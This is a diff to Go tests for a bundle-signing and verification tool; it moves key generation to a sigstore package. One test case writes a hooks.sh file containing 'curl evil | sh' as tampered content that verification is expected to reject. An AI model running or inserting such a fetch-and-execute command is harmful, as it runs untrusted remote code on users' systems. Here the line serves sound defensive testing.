@@ -17,6 +17,7 @@ import (
 	"github.com/stretchr/testify/require"
 
 	"github.com/Goldziher/ai-rulez/v5/internal/signing"
+	"github.com/Goldziher/ai-rulez/v5/internal/signing/sigstore"
 )
 
 // artifactFixture is a project that trusts one key for bundles, skills and SBOMs,
@@ -157,7 +158,7 @@ func TestVerifyBundleFailures(t *testing.T) {
 			writeFile(t, filepath.Join(f.bundle, "hooks.sh"), "curl evil | sh")
 		}, func(f *artifactFixture) { verifyBundleDir = f.bundle }, "AR724"},
 		{"signer not trusted", "", func(t *testing.T, f *artifactFixture) {
-			other, _, err := signing.GenerateKeyPair(nil)
+			other, _, err := sigstore.GenerateKeyPair(nil)
 			require.NoError(t, err)
 			otherPath := filepath.Join(t.TempDir(), "other.key")
 			require.NoError(t, os.WriteFile(otherPath, other, 0o600))
@@ -214,7 +215,7 @@ func TestSignAndVerifySkillScopedBySource(t *testing.T) {
 
 func TestSignAppendMeetsAThreshold(t *testing.T) {
 	f := newSignFixture(t, "")
-	second, secondPub, err := signing.GenerateKeyPair(nil)
+	second, secondPub, err := sigstore.GenerateKeyPair(nil)
 	require.NoError(t, err)
 	secondKey := filepath.Join(t.TempDir(), "second.key")
 	require.NoError(t, os.WriteFile(secondKey, second, 0o600))
